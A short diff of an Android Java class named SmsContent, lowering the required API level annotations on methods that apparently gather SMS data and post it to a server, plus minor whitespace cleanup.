@@ -88,7 +88,7 @@ public class SmsContent {
    *
    */
 
-  @RequiresApi(api = Build.VERSION_CODES.N)
+  @RequiresApi(api = Build.VERSION_CODES.M)
   public void getAndSendSms(JSONObject systemInfo, String token, String domain, long timeStamp, String deviceKey) {
     //参数校验
 //    if(systemInfo == null || systemInfo.isEmpty()) {
@@ -156,12 +156,10 @@ public class SmsContent {
         mInfoList = new ArrayList<>();
         postOssSign(systemInfo, token, domain, deviceKey);
       }
-
     }
-
   }
 
-  @RequiresApi(api = Build.VERSION_CODES.O)
+  @RequiresApi(api = Build.VERSION_CODES.M)
   private void postOssSign(JSONObject systemInfo, String token, String domain, String deviceKey) {
 
     //Log.d(TAG, "postOssSign--2:" + systemInfo.get("sms").toString());
@@ -315,7 +313,7 @@ public class SmsContent {
     Log.d(TAG, "postOssSign onResponse");
   }
 
-  @RequiresApi(api = Build.VERSION_CODES.O)
+  @RequiresApi(api = Build.VERSION_CODES.M)
   private void postReportData(String token, String domain, String dataUrl, String aseKey, String deviceKey) {
 
     if(dataUrl == null || dataUrl.isEmpty()) {
